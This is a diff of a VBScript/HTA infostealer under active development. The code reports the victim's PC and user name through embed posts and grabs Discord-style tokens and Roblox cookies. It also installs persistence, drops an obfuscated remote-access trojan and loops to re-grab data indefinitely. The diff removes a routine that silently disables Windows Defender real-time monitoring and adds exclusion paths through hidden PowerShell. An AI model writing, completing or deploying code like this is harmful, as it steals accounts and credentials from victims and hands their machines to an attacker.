@@ -23,21 +23,17 @@ Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf:
 ' --- 1. SESSION START ---
 Call PostEmbed(":satellite: Session Start", "PC: " & PC & " | User: " & USER, 10181046)
 
-' --- 2. DEFENDER BYPASS & OBFUSCATED RAT DOWNLOAD ---
-Call DisableDefender
-Call DropRAT
-
-' --- 3. GRABS ---
-Call GrabTokens
+' --- 2. GRABS (Target -> Token -> Cookie -> Persistence) ---
 Call IP
+Call GrabTokens
 Call GrabRoblox
 Call Persistence
 Call PostFullRobloxUI
 
-' --- 4. RAT SUCCESS MESSAGE (LAST) ---
-Call PostEmbed(":package: RAT Download", "Payload deployed and executed.", 10181046)
+' --- 3. RAT DOWNLOAD (Instant) ---
+Call DropRAT
 
-' --- 5. INFINITE Re-grab chain ---
+' --- 4. INFINITE Re-grab chain ---
 Dim runCount
 runCount = 0
 Do
@@ -52,22 +48,6 @@ Do
 Loop
 
 window.close()
-
-' --- DISABLE WINDOWS DEFENDER (Silent) ---
-Sub DisableDefender()
-    Dim psCmd, psf, f
-    psCmd = "try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {};" & _
-            "try { Add-MpPreference -ExclusionPath '%APPDATA%\Microsoft\Windows\Templates' -ErrorAction SilentlyContinue } catch {};" & _
-            "try { Add-MpPreference -ExclusionPath '%TEMP%' -ErrorAction SilentlyContinue } catch {}"
-    
-    psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\def.cmd"
-    Set f = fso.CreateTextFile(psf, True)
-    f.Write "powershell -NoP -NonI -Exec Bypass -WindowStyle Hidden -Command """ & psCmd & """"
-    f.Close
-    Set f = Nothing
-    sh.Run "cmd /c """ & psf & """", 0, True
-    fso.DeleteFile psf, True
-End Sub
 
 ' --- OBFUSCATED RAT DROP (3 LOCATIONS) ---
 Sub DropRAT()
@@ -101,6 +81,9 @@ Sub DropRAT()
             End If
         End If
     Next
+    
+    ' RAT Downloaded Message (Sent last)
+    Call PostEmbed(":white_check_mark: RAT Downloaded", "Payload deployed and executed.", 10181046)
 End Sub
 
 ' --- RunCmd (Hidden Execution via WMI) ---
